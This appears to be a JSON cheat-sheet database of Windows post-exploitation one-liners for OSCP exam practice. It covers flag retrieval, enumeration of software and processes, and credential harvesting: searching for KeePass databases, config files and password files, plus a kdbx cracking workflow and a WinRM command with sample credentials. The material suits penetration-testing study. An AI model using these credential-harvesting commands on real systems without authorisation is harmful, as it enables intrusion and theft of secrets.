{
  "commands": [
    {
      "id": "ps-search-desktop-flags",
      "name": "PowerShell Search Desktop for Flags",
      "description": "One-liner commands to locate and retrieve OSCP-style flags on Windows desktop directories",
      "command": "Get-Content C:\\Users\\<USERNAME>\\Desktop\\*.txt",
      "category": "post-exploit",
      "subcategory": "FLAG_RETRIEVAL",
      "os": "WINDOWS",
      "variables": [
        {
          "name": "<USERNAME>",
          "description": "Target username whose desktop to search",
          "example": "Administrator",
          "required": true
        }
      ],
      "flags": [],
      "examples": [
        {
          "command": "Get-Content C:\\Users\\Administrator\\Desktop\\*.txt",
          "description": "Read all .txt files on Administrator's desktop (typical flag location)",
          "context": "OSCP flag retrieval after privilege escalation"
        },
        {
          "command": "Get-Content C:\\Users\\Administrator\\Desktop\\proof.txt",
          "description": "Read specific proof.txt flag file (OSCP standard)",
          "context": "Direct flag retrieval when filename known"
        },
        {
          "command": "Get-ChildItem -Path C:\\Users\\Administrator\\Desktop -Recurse -File | Get-Content",
          "description": "Recursively read all files on Administrator desktop (including subdirectories)",
          "context": "Comprehensive flag search when location uncertain"
        },
        {
          "command": "dir C:\\Users\\Administrator\\Desktop",
          "description": "List desktop contents first to identify flag filename before retrieval",
          "context": "Reconnaissance before flag capture"
        },
        {
          "command": "Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.flag -ErrorAction SilentlyContinue | Select-Object FullName,Length | Format-Table -AutoSize",
          "description": "Search all user directories for .txt and .flag files (wide net approach)",
          "context": "Thorough flag hunting when standard paths empty"
        },
        {
          "command": "Get-Content C:\\Users\\*\\Desktop\\proof.txt",
          "description": "Search all user desktops for proof.txt using wildcard",
          "context": "Multi-user flag search"
        }
      ],
      "educational": {
        "purpose": "Quickly locate and retrieve OSCP exam flags from Windows hosts after gaining Administrator or SYSTEM access",
        "manual_alternative": "GUI navigation: Open File Explorer \u2192 C:\\Users\\Administrator\\Desktop \u2192 Double-click proof.txt (not practical via reverse shell)",
        "common_failures": [
          "Access denied - need Administrator or SYSTEM privileges to read other users' desktops",
          "File not found - flag may be in different user directory or subdirectory",
          "Wildcards (*) not expanding - ensure proper quoting in remote commands",
          "ErrorAction not set - errors from inaccessible directories halt execution"
        ],
        "when_to_use": [
          "Immediately after successful privilege escalation to Administrator/SYSTEM",
          "After lateral movement to retrieve remote host flags",
          "When combining with Invoke-Command for remote flag retrieval via WinRM",
          "OSCP exam flag capture phase"
        ],
        "exam_relevance": "CRITICAL - Final step in OSCP exploitation. Must retrieve proof.txt hash for points.",
        "time_estimate": "<5 seconds per command",
        "technical_notes": [
          "Get-Content (alias: cat, gc, type) reads file contents to stdout",
          "Wildcards (*) expand to match all files with pattern",
          "-Recurse searches subdirectories (slower but thorough)",
          "-ErrorAction SilentlyContinue suppresses access denied errors during broad searches",
          "Get-ChildItem (alias: dir, ls, gci) lists directory contents"
        ]
      },
      "oscp_priority": "HIGH",
      "tags": [
        "POWERSHELL",
        "FLAG_RETRIEVAL",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "PRIVILEGE_ESCALATION"
      ],
      "related_commands": [
        "ps-winrm-invoke-command",
        "ps-search-credentials",
        "ps-registry-autologon"
      ],
      "one_liner_combos": [
        {
          "description": "Remote flag retrieval via WinRM (complete one-liner)",
          "command": "$u='jen';$p='Nexus123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;Invoke-Command -ComputerName 192.168.117.70 -Credential $c -ScriptBlock {Get-Content C:\\Users\\Administrator\\Desktop\\*.txt}"
        },
        {
          "description": "List then retrieve (two-step one-liner with semicolon)",
          "command": "dir C:\\Users\\Administrator\\Desktop; Get-Content C:\\Users\\Administrator\\Desktop\\proof.txt"
        }
      ],
      "prerequisites": [
        "evil-winrm-shell"
      ],
      "alternatives": [
        "grep-r-private",
        "windows-flag-finder-cmd",
        "windows-flag-finder-ps",
        "linux-flag-finder"
      ],
      "next_steps": [
        "cat-file",
        "wget-download"
      ],
      "filled_example": "Get-Content C:\\Users\\Administrator\\Desktop\\*.txt"
    },
    {
      "id": "windows-flag-finder-cmd",
      "name": "Windows Flag Finder (CMD)",
      "description": "CMD one-liner to find OSCP flag files (flag.txt, proof.txt) with fallback to content search for OS{hash} pattern",
      "command": "cmd /c \"dir /s /b C:\\*flag*.txt C:\\*proof*.txt 2>nul & if errorlevel 1 findstr /s /i /m OS{ C:\\*.txt 2>nul\"",
      "category": "post-exploit",
      "subcategory": "FLAG_RETRIEVAL",
      "os": "WINDOWS",
      "variables": [],
      "flag_explanations": {
        "cmd /c": "Execute CMD command from PowerShell - required because dir/findstr are CMD builtins",
        "/s": "Recursive search - includes all subdirectories",
        "/b": "Bare format - shows full path only, no metadata (cleaner output)",
        "2>nul": "Redirect stderr to null - suppresses 'Access Denied' errors",
        "& if errorlevel 1": "CMD fallback - runs findstr only if dir found nothing (errorlevel 1)",
        "findstr /s": "Recursive string search through files",
        "findstr /i": "Case-insensitive matching",
        "findstr /m": "Print only filename (not matching line content)"
      },
      "tags": [
        "CMD",
        "FLAG_RETRIEVAL",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "ONE_LINER",
        "WINDOWS",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "C:\\Users\\Administrator\\Desktop\\proof.txt",
        "C:\\Users\\user\\Desktop\\local.txt",
        "Path to file containing OS{hash}"
      ],
      "failure_indicators": [
        "No output (flags not found)",
        "Access is denied (insufficient privileges)"
      ],
      "notes": "Windows equivalent of linux-flag-finder. Works in both PowerShell and CMD (wrapped with cmd /c). Searches entire C: drive - may take 30-60 seconds on large filesystems.\n\nOSCP Windows flags typically in:\n- C:\\Users\\Administrator\\Desktop\\proof.txt (after admin privesc)\n- C:\\Users\\<user>\\Desktop\\local.txt (initial foothold)\n\nFor faster results in pure CMD shell:\ndir /s /b C:\\Users\\*proof*.txt C:\\Users\\*local*.txt 2>nul",
      "alternatives": [
        "linux-flag-finder",
        "ps-search-desktop-flags",
        "windows-flag-finder-ps"
      ],
      "prerequisites": [],
      "next_steps": [
        "type-file"
      ]
    },
    {
      "id": "windows-flag-finder-ps",
      "name": "Windows Flag Finder (PowerShell) - Comprehensive",
      "description": "Comprehensive PowerShell flag finder searching filesystem, registry, and environment variables for OSCP flags",
      "command": "Write-Host \"`n[*] Searching filesystem...\" -ForegroundColor Cyan; $fc=0; Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue -Include *flag*.txt,*proof*.txt,*local*.txt | ForEach-Object { $fc++; Write-Host \"[FILE] $($_.FullName)\" -ForegroundColor Green; Get-Content $_.FullName }; Write-Host \"    Filesystem complete ($fc files found)\" -ForegroundColor DarkGray; Write-Host \"`n[*] Searching registry...\" -ForegroundColor Cyan; $rc=0; $hives=@('HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall','HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall','HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment'); foreach($hive in $hives){ Write-Host \"    Checking: $hive\" -ForegroundColor DarkGray; Get-ChildItem -Path $hive -ErrorAction SilentlyContinue | ForEach-Object { $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; $props.PSObject.Properties | Where-Object { $_.Value -match 'OS\\{[a-fA-F0-9]{32}\\}|flag|proof' } | ForEach-Object { $rc++; Write-Host \"[REG] $($_.Name): $($_.Value)\" -ForegroundColor Green } } }; Write-Host \"    Registry complete ($rc matches found)\" -ForegroundColor DarkGray; Write-Host \"`n[*] Checking environment variables...\" -ForegroundColor Cyan; $ec=0; Get-ChildItem Env: | Where-Object { $_.Value -match 'OS\\{|flag|proof' } | ForEach-Object { $ec++; Write-Host \"[ENV] $($_.Name)=$($_.Value)\" -ForegroundColor Green }; Write-Host \"    Environment complete ($ec matches found)\" -ForegroundColor DarkGray; Write-Host \"`n[+] Search complete: $fc files, $rc registry, $ec env vars\" -ForegroundColor Yellow",
      "category": "post-exploit",
      "subcategory": "FLAG_RETRIEVAL",
      "os": "WINDOWS",
      "variables": [],
      "flag_explanations": {
        "Write-Host ... -ForegroundColor Cyan": "Visual section headers for clarity during search",
        "Get-ChildItem -Path C:\\ -Recurse": "Recursive filesystem search from root",
        "-Include *flag*.txt,*proof*.txt,*local*.txt": "Match common OSCP flag filenames",
        "ForEach-Object { Get-Content $_.FullName }": "Display file contents when found",
        "Get-ChildItem -Path HKLM:\\SOFTWARE,HKCU:\\SOFTWARE": "Search both machine and user registry hives",
        "Get-ItemProperty $_.PSPath": "Read all values from each registry key",
        "$_.Value -match 'OS\\{[a-fA-F0-9]{32}\\}'": "Regex match for OSCP flag format in registry values",
        "Get-ChildItem Env:": "Enumerate all environment variables",
        "[FILE], [REG], [ENV] prefixes": "Indicate source location of found flags"
      },
      "tags": [
        "POWERSHELL",
        "FLAG_RETRIEVAL",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "ONE_LINER",
        "WINDOWS",
        "QUICK_WIN",
        "REGISTRY"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "[FILE] C:\\Users\\Administrator\\Desktop\\proof.txt",
        "[REG] OS{32hexchars}",
        "[ENV] FLAG=OS{32hexchars}",
        "Green colored output with flag content"
      ],
      "failure_indicators": [
        "No green output (flags not found in any location)",
        "Red error text (syntax error - check escaping)",
        "Takes >5 minutes (reduce search scope)"
      ],
      "troubleshooting": {
        "No output": "Try targeted searches separately - filesystem, registry, env vars",
        "Too slow": "Search user directories only: Get-ChildItem C:\\Users -Recurse -Include *proof*,*local* -ErrorAction SilentlyContinue",
        "Registry timeout": "Search specific hive: Get-ChildItem HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall -Recurse -ErrorAction SilentlyContinue",
        "Flag in unexpected format": "Broaden regex: -match 'flag|proof|OS\\{|CTF\\{'"
      },
      "notes": "Comprehensive flag finder that searches THREE locations:\n\n1. FILESYSTEM: Files named *flag*.txt, *proof*.txt, *local*.txt\n2. REGISTRY: Values matching OS{32-hex} pattern in HKLM and HKCU\n3. ENVIRONMENT: Variables containing flag/proof keywords\n\nWhy registry matters:\n- CTF flags sometimes hidden as fake 'Uninstall' entries\n- Custom apps may store secrets in registry\n- Less obvious than Desktop files\n\nOutput is color-coded:\n- [FILE] = Filesystem hit\n- [REG] = Registry hit  \n- [ENV] = Environment variable hit\n\nTime estimate: 60-180 seconds for full scan.",
      "alternatives": [
        "linux-flag-finder",
        "ps-search-desktop-flags",
        "windows-flag-finder-cmd",
        "windows-flag-finder-ps-simple"
      ],
      "prerequisites": [],
      "next_steps": [
        "cat-file",
        "ps-search-desktop-flags"
      ]
    },
    {
      "id": "windows-flag-finder-ps-simple",
      "name": "Windows Flag Finder (PowerShell) - Simple",
      "description": "Simple PowerShell flag finder for filesystem only (faster, less comprehensive)",
      "command": "$f=Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue -Include *flag*.txt,*proof*.txt; if($f){$f.FullName}else{Get-ChildItem C:\\ -Recurse -Include *.txt -ErrorAction SilentlyContinue | Select-String -Pattern 'OS\\{[a-fA-F0-9]{32}\\}' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path -Unique}",
      "category": "post-exploit",
      "subcategory": "FLAG_RETRIEVAL",
      "os": "WINDOWS",
      "variables": [],
      "flag_explanations": {
        "$f=...": "Store search results in variable for conditional logic",
        "Get-ChildItem -Recurse": "Recursive filesystem search",
        "-Include *flag*.txt,*proof*.txt": "Filter to flag/proof filenames",
        "-ErrorAction SilentlyContinue": "Suppress access denied errors",
        "Select-String -Pattern 'OS\\{...\\}'": "Fallback content search for flag pattern"
      },
      "tags": [
        "POWERSHELL",
        "FLAG_RETRIEVAL",
        "POST_EXPLOIT",
        "OSCP:MEDIUM",
        "ONE_LINER",
        "WINDOWS"
      ],
      "oscp_relevance": "medium",
      "notes": "Simpler/faster version that only searches filesystem. Use windows-flag-finder-ps for comprehensive search including registry.",
      "alternatives": [
        "windows-flag-finder-ps",
        "windows-flag-finder-cmd"
      ],
      "prerequisites": [],
      "next_steps": [
        "cat-file"
      ]
    },
    {
      "id": "ps-enum-installed-apps",
      "name": "Enumerate Installed Applications (PowerShell)",
      "description": "List all installed applications from registry to identify vulnerable software for privilege escalation",
      "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\",\"HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -AutoSize",
      "category": "post-exploit",
      "subcategory": "ENUMERATION",
      "os": "WINDOWS",
      "variables": [],
      "flag_explanations": {
        "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*": "Registry path for 64-bit installed applications",
        "HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*": "Registry path for 32-bit applications on 64-bit Windows (WoW64 redirection)",
        "-ErrorAction SilentlyContinue": "Suppress errors for registry keys without read access",
        "Select-Object DisplayName,DisplayVersion,Publisher": "Extract only relevant fields - app name, version, vendor",
        "Sort-Object DisplayName": "Alphabetical sorting for easier review",
        "Format-Table -AutoSize": "Clean tabular output that fits column widths"
      },
      "tags": [
        "POWERSHELL",
        "ENUMERATION",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Table showing DisplayName, DisplayVersion, Publisher columns",
        "List of installed software with version numbers"
      ],
      "failure_indicators": [
        "Empty output (no registry access or no apps installed)",
        "Red error text (syntax error - check commas between properties)"
      ],
      "troubleshooting": {
        "Empty output": "Check registry access: Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select-Object -First 5",
        "Missing 32-bit apps": "Query WOW6432Node separately: Get-ItemProperty 'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'",
        "Format issues": "Remove Format-Table for raw object output: ... | Select-Object DisplayName,DisplayVersion,Publisher"
      },
      "notes": "Essential post-exploitation enumeration for privilege escalation. Look for:\n- Outdated software with known CVEs (TeamViewer, FileZilla, WinSCP)\n- Custom/internal applications (often vulnerable)\n- Backup software (Veeam - CVE-2023-27532)\n- Remote access tools with stored credentials\n- PDF readers, office suites with known exploits\n\nAlternative methods:\n- WMI (slower): Get-WmiObject -Class Win32_Product\n- CMD: wmic product get name,version\n\nOSCP Tip: Cross-reference versions with searchsploit for local privilege escalation exploits.",
      "alternatives": [],
      "prerequisites": [],
      "next_steps": [
        "searchsploit-local"
      ]
    },
    {
      "id": "ps-enum-processes",
      "name": "Enumerate Running Processes with Paths",
      "description": "List all running processes with their executable paths to identify vulnerable or interesting software",
      "command": "Get-Process | Where-Object {$_.Path} | Select-Object ProcessName,Id,Path | Sort-Object Path | Format-Table -AutoSize",
      "category": "post-exploit",
      "subcategory": "ENUMERATION",
      "os": "WINDOWS",
      "variables": [],
      "flag_explanations": {
        "Get-Process": "Retrieve all running processes on the system",
        "Where-Object {$_.Path}": "Filter to only processes with a valid path (excludes system processes without paths)",
        "Select-Object ProcessName,Id,Path": "Extract process name, PID, and full executable path",
        "Sort-Object Path": "Sort by path to group processes from same directory",
        "Format-Table -AutoSize": "Clean tabular output with auto-fitted columns"
      },
      "tags": [
        "POWERSHELL",
        "ENUMERATION",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Table showing ProcessName, Id, Path columns",
        "Executable paths visible for running processes"
      ],
      "failure_indicators": [
        "Empty output (no processes with paths - unlikely)",
        "Access denied for certain process details"
      ],
      "notes": "Essential enumeration to identify:\n- Outdated software with known CVEs\n- Custom/internal applications\n- Web servers (httpd, nginx, tomcat)\n- Database servers (mysql, postgres, mssql)\n- Backup software running as SYSTEM\n- Services running from user-writable paths (DLL hijacking)\n\nLook for processes NOT in C:\\Windows - these are often exploitable.",
      "alternatives": [
        "ps-enum-processes-wmi",
        "ps-enum-processes-nonstandard"
      ],
      "prerequisites": [],
      "next_steps": [
        "ps-enum-installed-apps",
        "searchsploit-local"
      ]
    },
    {
      "id": "ps-enum-processes-wmi",
      "name": "Enumerate Processes with Command Line (WMI)",
      "description": "List processes with full command line arguments using WMI - reveals configuration details and credentials",
      "command": "Get-WmiObject Win32_Process | Select-Object Name,ProcessId,ExecutablePath,CommandLine | Format-Table -AutoSize -Wrap",
      "category": "post-exploit",
      "subcategory": "ENUMERATION",
      "os": "WINDOWS",
      "variables": [],
      "flag_explanations": {
        "Get-WmiObject Win32_Process": "Query WMI for process information (more details than Get-Process)",
        "ExecutablePath": "Full path to the executable binary",
        "CommandLine": "Complete command line including arguments - may contain credentials!",
        "-Wrap": "Wrap long command lines instead of truncating"
      },
      "tags": [
        "POWERSHELL",
        "ENUMERATION",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "CREDENTIAL_HARVESTING",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Command line arguments visible",
        "Credentials or config paths in arguments"
      ],
      "notes": "WMI provides CommandLine which may contain:\n- Database credentials: mysql -u root -pPassword123\n- API keys in arguments\n- Config file paths\n- Service account credentials\n\nSlower than Get-Process but much more information.",
      "alternatives": [
        "ps-enum-processes"
      ],
      "prerequisites": [],
      "next_steps": [
        "ps-search-credentials"
      ]
    },
    {
      "id": "ps-enum-processes-nonstandard",
      "name": "Find Processes Outside Windows Directory",
      "description": "Filter for processes running from non-standard paths - likely third-party or vulnerable software",
      "command": "Get-Process | Where-Object {$_.Path -and $_.Path -notlike 'C:\\Windows\\*'} | Select-Object ProcessName,Id,Path | Sort-Object Path | Format-Table -AutoSize",
      "category": "post-exploit",
      "subcategory": "ENUMERATION",
      "os": "WINDOWS",
      "variables": [],
      "flag_explanations": {
        "$_.Path -notlike 'C:\\Windows\\*'": "Exclude Windows system processes to focus on third-party software",
        "Sort-Object Path": "Group by installation directory for easier review"
      },
      "tags": [
        "POWERSHELL",
        "ENUMERATION",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "PRIVILEGE_ESCALATION",
        "WINDOWS",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "notes": "Quick filter to find interesting processes:\n- Web servers (XAMPP, WAMP, IIS apps)\n- Custom applications\n- Backup agents\n- Remote access tools\n- Database servers\n\nThese are prime targets for privilege escalation.",
      "alternatives": [
        "ps-enum-processes"
      ],
      "prerequisites": [],
      "next_steps": [
        "ps-enum-installed-apps",
        "searchsploit-local"
      ]
    },
    {
      "id": "ps-search-keepass-db",
      "name": "Search for KeePass Databases",
      "description": "Search filesystem for KeePass password manager database files (.kdbx) which may contain stored credentials",
      "command": "Get-ChildItem -Path <SEARCH_PATH> -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
      "category": "post-exploit",
      "subcategory": "CREDENTIAL_HARVESTING",
      "os": "WINDOWS",
      "variables": [
        {
          "name": "<SEARCH_PATH>",
          "description": "Root path to search from",
          "example": "C:\\",
          "required": true
        }
      ],
      "flag_explanations": {
        "-Path <SEARCH_PATH>": "Starting directory for recursive search (C:\\ for full drive)",
        "-Include *.kdbx": "Filter for KeePass database file extension",
        "-File": "Only return files, not directories",
        "-Recurse": "Search all subdirectories",
        "-ErrorAction SilentlyContinue": "Suppress access denied errors for clean output"
      },
      "tags": [
        "POWERSHELL",
        "CREDENTIAL_HARVESTING",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "PASSWORD_MANAGER",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Path to .kdbx file displayed",
        "C:\\Users\\*\\*.kdbx found"
      ],
      "failure_indicators": [
        "No output (no KeePass databases found)",
        "Access denied to all directories"
      ],
      "notes": "KeePass databases (.kdbx) are encrypted but can be cracked with keepass2john + hashcat/john.\n\nWorkflow after finding .kdbx:\n1. Transfer file to Kali: copy \\\\KALI\\share\\db.kdbx\n2. Extract hash: keepass2john Database.kdbx > keepass.hash\n3. Crack: hashcat -m 13400 keepass.hash wordlist.txt\n\nAlso search for .kdb (older KeePass 1.x format).",
      "alternatives": [
        "ps-search-password-files"
      ],
      "prerequisites": [],
      "next_steps": [
        "keepass2john",
        "hashcat-keepass"
      ],
      "filled_example": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
    },
    {
      "id": "ps-search-app-config",
      "name": "Search Application Directory for Config Files",
      "description": "Search an application's installation directory for configuration files that may contain credentials",
      "command": "Get-ChildItem -Path <APP_PATH> -Include *.txt,*.ini,*.conf,*.config,*.xml,*.json -File -Recurse -ErrorAction SilentlyContinue",
      "category": "post-exploit",
      "subcategory": "CREDENTIAL_HARVESTING",
      "os": "WINDOWS",
      "variables": [
        {
          "name": "<APP_PATH>",
          "description": "Application installation directory",
          "example": "C:\\xampp",
          "required": true
        }
      ],
      "flag_explanations": {
        "-Path <APP_PATH>": "Application installation directory (e.g., C:\\xampp, C:\\Program Files\\AppName)",
        "-Include *.txt,*.ini,*.conf,*.config,*.xml,*.json": "Common configuration file extensions",
        "-File": "Only return files, not directories",
        "-Recurse": "Search all subdirectories"
      },
      "tags": [
        "POWERSHELL",
        "CREDENTIAL_HARVESTING",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "WEB_SERVER",
        "DATABASE",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "passwords.txt or similar found",
        "*.ini config files found",
        "*.config files with connection strings",
        "*.json with API keys"
      ],
      "notes": "Use after identifying installed apps with ps-enum-installed-apps.\n\nCommon Application Paths & High-Value Files:\n| App         | Path               | High-Value Files                      |\n|-------------|--------------------|---------------------------------------|\n| XAMPP       | C:\\xampp           | passwords.txt, my.ini, config.inc.php |\n| WAMP        | C:\\wamp            | my.ini, php.ini                       |\n| IIS         | C:\\inetpub         | web.config                            |\n| Custom Apps | C:\\Program Files\\* | *.config, *.ini                       |\n| App Data    | C:\\ProgramData\\*   | credentials.*, settings.*             |\n\nAdditional high-value files:\n- config.inc.php (phpMyAdmin)\n- my.ini/my.cnf (MySQL)\n- pg_hba.conf (PostgreSQL)\n- appsettings.json (.NET Core)",
      "alternatives": [
        "ps-search-config-files"
      ],
      "prerequisites": [
        "ps-enum-installed-apps"
      ],
      "next_steps": [
        "type-file",
        "ps-search-credentials"
      ],
      "filled_example": "Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.config,*.xml,*.json -File -Recurse -ErrorAction SilentlyContinue"
    },
    {
      "id": "ps-search-user-documents",
      "name": "Search User Directory for Documents",
      "description": "Search user home directory for documents that may contain sensitive information like passwords or notes",
      "command": "Get-ChildItem -Path <USER_PATH> -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
      "category": "post-exploit",
      "subcategory": "CREDENTIAL_HARVESTING",
      "os": "WINDOWS",
      "variables": [
        {
          "name": "<USER_PATH>",
          "description": "User home directory to search",
          "example": "C:\\Users\\dave\\",
          "required": true
        }
      ],
      "flag_explanations": {
        "-Path <USER_PATH>": "User home directory (C:\\Users\\username\\)",
        "-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx": "Common document formats that may contain sensitive info",
        "-File": "Only return files, not directories",
        "-Recurse": "Search Desktop, Documents, Downloads, and all subdirectories"
      },
      "tags": [
        "POWERSHELL",
        "CREDENTIAL_HARVESTING",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "ENUMERATION",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Files found on Desktop",
        "Documents in Downloads folder",
        "Excel spreadsheets (often contain passwords)"
      ],
      "notes": "Users often store passwords in plain text files on Desktop - the digital Post-it note.\n\nHigh-value locations:\n- Desktop - quick access files\n- Documents - work files\n- Downloads - recently acquired files\n\nLook for filenames containing: password, cred, login, vpn, ssh, key, secret, backup",
      "alternatives": [
        "ps-search-password-files"
      ],
      "prerequisites": [],
      "next_steps": [
        "type-file",
        "ps-search-credentials"
      ],
      "filled_example": "Get-ChildItem -Path C:\\Users\\dave\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue"
    },
    {
      "id": "ps-search-password-files",
      "name": "Search for Password-Related Files",
      "description": "Search for files with password-related keywords in filename across the system",
      "command": "Get-ChildItem -Path <SEARCH_PATH> -Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup* -File -Recurse -ErrorAction SilentlyContinue",
      "category": "post-exploit",
      "subcategory": "CREDENTIAL_HARVESTING",
      "os": "WINDOWS",
      "variables": [
        {
          "name": "<SEARCH_PATH>",
          "description": "Root path to search from",
          "example": "C:\\",
          "required": true
        }
      ],
      "flag_explanations": {
        "-Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup*": "Common patterns for sensitive files",
        "-File": "Only return files, not directories",
        "-Recurse": "Search all subdirectories"
      },
      "tags": [
        "POWERSHELL",
        "CREDENTIAL_HARVESTING",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "QUICK_WIN",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "passwords.txt found",
        "credentials.xml found",
        "*.kdbx database found",
        "backup files with passwords"
      ],
      "notes": "Quick win command to find low-hanging fruit credentials.\n\nCommon finds:\n- passwords.txt - plaintext password lists\n- credentials.xml - application saved credentials\n- *.kdbx - KeePass databases\n- *backup* - database or config backups\n\nExpand search patterns as needed: *vpn*, *ssh*, *key*, *token*",
      "alternatives": [
        "ps-search-keepass-db",
        "ps-search-user-documents"
      ],
      "prerequisites": [],
      "next_steps": [
        "type-file"
      ],
      "filled_example": "Get-ChildItem -Path C:\\ -Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup* -File -Recurse -ErrorAction SilentlyContinue"
    },
    {
      "id": "ps-search-config-files",
      "name": "Search for Application Config Files",
      "description": "Search for application configuration files that commonly contain hardcoded credentials",
      "command": "Get-ChildItem -Path <SEARCH_PATH> -Include *.ini,*.config,*.xml,*.conf,web.config,*.json -File -Recurse -ErrorAction SilentlyContinue",
      "category": "post-exploit",
      "subcategory": "CREDENTIAL_HARVESTING",
      "os": "WINDOWS",
      "variables": [
        {
          "name": "<SEARCH_PATH>",
          "description": "Root path to search from",
          "example": "C:\\",
          "required": true
        }
      ],
      "flag_explanations": {
        "-Include *.ini,*.config,*.xml,*.conf,web.config,*.json": "Common configuration file extensions",
        "-File": "Only return files, not directories",
        "-Recurse": "Search all subdirectories"
      },
      "tags": [
        "POWERSHELL",
        "CREDENTIAL_HARVESTING",
        "POST_EXPLOIT",
        "OSCP:HIGH",
        "WEB_SERVER",
        "DATABASE",
        "WINDOWS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "web.config found (ASP.NET connection strings)",
        "*.ini files in Program Files",
        "application.json or appsettings.json"
      ],
      "notes": "Configuration files often contain:\n- Database connection strings with passwords\n- API keys and tokens\n- Service account credentials\n- SMTP credentials\n\nHigh-value targets:\n- C:\\inetpub\\wwwroot\\web.config - IIS/ASP.NET\n- C:\\xampp\\*\\*.ini - XAMPP stack\n- C:\\Program Files\\*\\*.config - Installed apps",
      "alternatives": [],
      "prerequisites": [],
      "next_steps": [
        "type-file",
        "ps-search-credentials"
      ],
      "filled_example": "Get-ChildItem -Path C:\\ -Include *.ini,*.config,*.xml,*.conf,web.config,*.json -File -Recurse -ErrorAction SilentlyContinue"
    }
  ]
}